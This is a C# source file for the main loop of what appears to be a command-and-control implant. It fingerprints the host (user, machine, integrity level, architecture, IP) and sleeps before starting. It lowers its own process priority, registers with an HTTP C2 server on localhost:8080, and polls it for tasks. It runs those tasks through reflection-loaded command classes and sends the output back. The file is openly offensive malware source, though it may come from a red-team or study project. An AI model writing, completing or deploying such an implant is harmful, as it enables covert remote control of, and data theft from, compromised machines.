using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Reflection;
using System.Threading;

using Implant.Models;
using Implant.Utils;

namespace Implant
{
    class Program
    {
        private static ImplantData _implantData;
        private static Comms _comms;
        private static CancellationTokenSource _cancelToken;

        private static List<ImplantCommands> _commands = new List<ImplantCommands>();

        //put into utils
        public static void GenImplantData(){
            var proc = Process.GetCurrentProcess();

            _implantData = new ImplantData {
             
                ID = ImplantDataUtils.GenImplantName(), HostName = Environment.MachineName,
                User = Environment.UserName, Integrity = ImplantDataUtils.ReturnIntegrity(),
                Arch = ImplantDataUtils.ReturnArch(),
                ProcID = proc.Id, ProcName = proc.ProcessName,
                IPAddr = ImplantDataUtils.GetHostIP()
            };

            proc.Dispose();
        }

        public static void SendTaskOut(ImplantTask task, string _id, string _out) {
            var taskOut = new ImplantTaskOut { Id = _id, TaskName = task.Command, TaskArgs = task.Args,TaskOut = _out };
            _comms.DataSend(taskOut);
        }

        public static void HandleTask(ImplantTask task) {
            var command = _commands.FirstOrDefault(cmd => cmd.Name.Equals(task.Command, StringComparison.InvariantCultureIgnoreCase));
            if (command is null) { return; }

            try {
                var _out = command.Execute(task);
                SendTaskOut(task, task.Id, _out);
            } catch (Exception e) { SendTaskOut(task, task.Id, e.Message); }
        }

        public static void HandleTasks(IEnumerable<ImplantTask> tasks) { foreach (var task in tasks) { HandleTask(task); } }

        public static void ImplantCommandsInit() {
            foreach (Type type in Assembly.GetExecutingAssembly().GetTypes()) {
                if (type.IsSubclassOf(typeof(ImplantCommands))) {
                    ImplantCommands cmd = Activator.CreateInstance(type) as ImplantCommands;
                    _commands.Add(cmd);
                }
            }
        }

        public void Stop() { _cancelToken.Cancel(); }

        static void Main(string[] args) {

            Thread.Sleep(10000);

            Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.Idle;

            GenImplantData();
            ImplantCommandsInit();

            _comms = new HTTPComms("localhost", 8080);
            _comms.ImplantInit(_implantData);
            _comms.Start();

            _cancelToken = new CancellationTokenSource();

            while (!_cancelToken.IsCancellationRequested) {
                Thread.Sleep(1000);
                if (_comms.DataRecv(out var tasks)) { HandleTasks(tasks); }
            }
        }

    }
}
